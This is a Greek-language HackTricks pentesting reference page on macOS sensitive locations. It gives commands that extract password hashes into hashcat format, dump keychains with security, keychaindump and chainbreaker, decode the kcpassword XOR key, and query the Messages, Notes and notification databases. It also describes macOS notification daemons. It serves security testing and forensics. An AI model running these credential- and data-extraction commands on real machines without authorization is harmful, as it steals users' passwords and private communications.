# macOS Ευαίσθητες Τοποθεσίες & Ενδιαφέροντες Daemons

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στο** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) ή στο [**telegram group**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Κωδικοί Πρόσβασης

### Κωδικοί Σκιάς

Ο κωδικός σκιάς αποθηκεύεται με τη διαμόρφωση του χρήστη σε plist που βρίσκονται στο **`/var/db/dslocal/nodes/Default/users/`**.\
Η παρακάτω εντολή μπορεί να χρησιμοποιηθεί για να εξάγει **όλες τις πληροφορίες σχετικά με τους χρήστες** (συμπεριλαμβανομένων των πληροφοριών hash): 

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Σενάρια όπως αυτό**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ή [**αυτό**](https://github.com/octomagon/davegrohl.git) μπορούν να χρησιμοποιηθούν για να μετατρέψουν το hash σε **μορφή** **hashcat**.

Μια εναλλακτική one-liner που θα εξάγει τα creds όλων των μη υπηρεσιακών λογαριασμών σε μορφή hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain Dump

Σημειώστε ότι όταν χρησιμοποιείτε το δυαδικό αρχείο security για να **εκφορτώσετε τους αποκρυπτογραφημένους κωδικούς πρόσβασης**, αρκετές προτροπές θα ζητήσουν από τον χρήστη να επιτρέψει αυτή τη λειτουργία.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Βασισμένο σε αυτό το σχόλιο [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), φαίνεται ότι αυτά τα εργαλεία δεν λειτουργούν πια στο Big Sur.
{% endhint %}

### Keychaindump Overview

Ένα εργαλείο που ονομάζεται **keychaindump** έχει αναπτυχθεί για να εξάγει κωδικούς πρόσβασης από τα keychains του macOS, αλλά αντιμετωπίζει περιορισμούς σε νεότερες εκδόσεις του macOS όπως το Big Sur, όπως αναφέρεται σε μια [συζήτηση](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Η χρήση του **keychaindump** απαιτεί από τον επιτιθέμενο να αποκτήσει πρόσβαση και να αναβαθμίσει τα δικαιώματα σε **root**. Το εργαλείο εκμεταλλεύεται το γεγονός ότι το keychain είναι ξεκλείδωτο από προεπιλογή κατά την είσοδο του χρήστη για ευκολία, επιτρέποντας στις εφαρμογές να έχουν πρόσβαση σε αυτό χωρίς να απαιτείται επανειλημμένα ο κωδικός πρόσβασης του χρήστη. Ωστόσο, αν ένας χρήστης επιλέξει να κλειδώσει το keychain του μετά από κάθε χρήση, το **keychaindump** καθίσταται αναποτελεσματικό.

**Keychaindump** λειτουργεί στοχεύοντας μια συγκεκριμένη διαδικασία που ονομάζεται **securityd**, την οποία περιγράφει η Apple ως ένα daemon για εξουσιοδότηση και κρυπτογραφικές λειτουργίες, κρίσιμη για την πρόσβαση στο keychain. Η διαδικασία εξαγωγής περιλαμβάνει την αναγνώριση ενός **Master Key** που προέρχεται από τον κωδικό πρόσβασης του χρήστη. Αυτό το κλειδί είναι απαραίτητο για την ανάγνωση του αρχείου keychain. Για να εντοπίσει το **Master Key**, το **keychaindump** σαρώνει την μνήμη του **securityd** χρησιμοποιώντας την εντολή `vmmap`, αναζητώντας πιθανά κλειδιά σε περιοχές που έχουν σημαδευτεί ως `MALLOC_TINY`. Η ακόλουθη εντολή χρησιμοποιείται για να επιθεωρήσει αυτές τις τοποθεσίες μνήμης:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Μετά την αναγνώριση πιθανών κύριων κλειδιών, το **keychaindump** αναζητά μέσα στους σωρούς για ένα συγκεκριμένο μοτίβο (`0x0000000000000018`) που υποδεικνύει έναν υποψήφιο για το κύριο κλειδί. Απαιτούνται περαιτέρω βήματα, συμπεριλαμβανομένης της αποσυμπίεσης, για να χρησιμοποιηθεί αυτό το κλειδί, όπως περιγράφεται στον πηγαίο κώδικα του **keychaindump**. Οι αναλυτές που εστιάζουν σε αυτόν τον τομέα θα πρέπει να σημειώσουν ότι τα κρίσιμα δεδομένα για την αποκρυπτογράφηση του keychain αποθηκεύονται μέσα στη μνήμη της διαδικασίας **securityd**. Ένα παράδειγμα εντολής για να εκτελέσετε το **keychaindump** είναι:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) μπορεί να χρησιμοποιηθεί για την εξαγωγή των παρακάτω τύπων πληροφοριών από ένα OSX keychain με εγκληματολογικά σωστό τρόπο:

* Hashed Keychain password, κατάλληλο για cracking με [hashcat](https://hashcat.net/hashcat/) ή [John the Ripper](https://www.openwall.com/john/)
* Internet Passwords
* Generic Passwords
* Private Keys
* Public Keys
* X509 Certificates
* Secure Notes
* Appleshare Passwords

Δεδομένου του κωδικού ξεκλειδώματος του keychain, ένα master key που αποκτήθηκε χρησιμοποιώντας [volafox](https://github.com/n0fate/volafox) ή [volatility](https://github.com/volatilityfoundation/volatility), ή ένα αρχείο ξεκλειδώματος όπως το SystemKey, το Chainbreaker θα παρέχει επίσης plaintext passwords.

Χωρίς μία από αυτές τις μεθόδους ξεκλειδώματος του Keychain, το Chainbreaker θα εμφανίσει όλες τις άλλες διαθέσιμες πληροφορίες.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών keychain (με κωδικούς πρόσβασης) με το SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών keychain (με κωδικούς πρόσβασης) σπάζοντας το hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών keychain (με κωδικούς πρόσβασης) με dump μνήμης**

[Ακολουθήστε αυτά τα βήματα](../#dumping-memory-with-osxpmem) για να εκτελέσετε ένα **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Εξαγωγή κλειδιών keychain (με κωδικούς πρόσβασης) χρησιμοποιώντας τον κωδικό πρόσβασης του χρήστη**

Αν γνωρίζετε τον κωδικό πρόσβασης του χρήστη, μπορείτε να τον χρησιμοποιήσετε για να **εξάγετε και να αποκρυπτογραφήσετε τα keychains που ανήκουν στον χρήστη**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Το αρχείο **kcpassword** είναι ένα αρχείο που περιέχει τον **κωδικό πρόσβασης του χρήστη**, αλλά μόνο αν ο ιδιοκτήτης του συστήματος έχει **ενεργοποιήσει την αυτόματη σύνδεση**. Επομένως, ο χρήστης θα συνδέεται αυτόματα χωρίς να του ζητείται κωδικός πρόσβασης (το οποίο δεν είναι πολύ ασφαλές).

Ο κωδικός πρόσβασης αποθηκεύεται στο αρχείο **`/etc/kcpassword`** xored με το κλειδί **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Αν ο κωδικός πρόσβασης του χρήστη είναι μεγαλύτερος από το κλειδί, το κλειδί θα επαναχρησιμοποιηθεί.\
Αυτό καθιστά τον κωδικό πρόσβασης αρκετά εύκολο να ανακτηθεί, για παράδειγμα χρησιμοποιώντας σενάρια όπως [**αυτό**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Μπορείτε να βρείτε τα δεδομένα Notifications στο `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Οι περισσότερες από τις ενδιαφέρουσες πληροφορίες θα βρίσκονται στο **blob**. Έτσι, θα χρειαστεί να **εξαγάγετε** αυτό το περιεχόμενο και να το **μετατρέψετε** σε **ανθρώπινα** **αναγνώσιμα** ή να χρησιμοποιήσετε **`strings`**. Για να έχετε πρόσβαση σε αυτό, μπορείτε να κάνετε: 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Σημειώσεις

Οι **σημειώσεις** των χρηστών μπορούν να βρεθούν στο `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Προτιμήσεις

Στις εφαρμογές macOS, οι προτιμήσεις βρίσκονται στο **`$HOME/Library/Preferences`** και στο iOS βρίσκονται στο `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

Στο macOS, το εργαλείο cli **`defaults`** μπορεί να χρησιμοποιηθεί για **να τροποποιήσει το αρχείο Προτιμήσεων**.

**`/usr/sbin/cfprefsd`** διεκδικεί τις υπηρεσίες XPC `com.apple.cfprefsd.daemon` και `com.apple.cfprefsd.agent` και μπορεί να κληθεί για να εκτελέσει ενέργειες όπως η τροποποίηση προτιμήσεων.

## Συστήματα Ειδοποιήσεων

### Ειδοποιήσεις Darwin

Ο κύριος δαίμονας για τις ειδοποιήσεις είναι **`/usr/sbin/notifyd`**. Για να λάβουν ειδοποιήσεις, οι πελάτες πρέπει να εγγραφούν μέσω της Mach θύρας `com.apple.system.notification_center` (ελέγξτε τις με `sudo lsmp -p <pid notifyd>`). Ο δαίμονας είναι ρυθμιζόμενος με το αρχείο `/etc/notify.conf`.

Τα ονόματα που χρησιμοποιούνται για τις ειδοποιήσεις είναι μοναδικές αντίστροφες σημειώσεις DNS και όταν μια ειδοποίηση αποστέλλεται σε ένα από αυτά, οι πελάτες που έχουν δηλώσει ότι μπορούν να την χειριστούν θα την λάβουν.

Είναι δυνατόν να εκφορτωθεί η τρέχουσα κατάσταση (και να δουν όλα τα ονόματα) στέλνοντας το σήμα SIGUSR2 στη διαδικασία notifyd και διαβάζοντας το παραγόμενο αρχείο: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Το **Distributed Notification Center** του οποίου το κύριο δυαδικό είναι **`/usr/sbin/distnoted`**, είναι ένας άλλος τρόπος αποστολής ειδοποιήσεων. Εκθέτει ορισμένες υπηρεσίες XPC και εκτελεί κάποιους ελέγχους για να προσπαθήσει να επαληθεύσει τους πελάτες.

### Apple Push Notifications (APN)

Σε αυτή την περίπτωση, οι εφαρμογές μπορούν να εγγραφούν για **topics**. Ο πελάτης θα δημιουργήσει ένα token επικοινωνώντας με τους διακομιστές της Apple μέσω του **`apsd`**.\
Στη συνέχεια, οι πάροχοι θα έχουν επίσης δημιουργήσει ένα token και θα μπορούν να συνδεθούν με τους διακομιστές της Apple για να στείλουν μηνύματα στους πελάτες. Αυτά τα μηνύματα θα γίνονται τοπικά δεκτά από το **`apsd`** το οποίο θα προωθήσει την ειδοποίηση στην εφαρμογή που την περιμένει.

Οι προτιμήσεις βρίσκονται στο `/Library/Preferences/com.apple.apsd.plist`.

Υπάρχει μια τοπική βάση δεδομένων μηνυμάτων που βρίσκεται στο macOS στο `/Library/Application\ Support/ApplePushService/aps.db` και στο iOS στο `/var/mobile/Library/ApplePushService`. Έχει 3 πίνακες: `incoming_messages`, `outgoing_messages` και `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Είναι επίσης δυνατό να αποκτήσετε πληροφορίες σχετικά με τον daemon και τις συνδέσεις χρησιμοποιώντας:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Αυτές είναι οι ειδοποιήσεις που θα πρέπει να βλέπει ο χρήστης στην οθόνη:

* **`CFUserNotification`**: Αυτή η API παρέχει έναν τρόπο να εμφανίζεται στην οθόνη ένα αναδυόμενο παράθυρο με ένα μήνυμα.
* **The Bulletin Board**: Αυτό εμφανίζει σε iOS μια διαφήμιση που εξαφανίζεται και θα αποθηκευτεί στο Κέντρο Ειδοποιήσεων.
* **`NSUserNotificationCenter`**: Αυτό είναι το bulletin board iOS στο MacOS. Η βάση δεδομένων με τις ειδοποιήσεις βρίσκεται στο `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
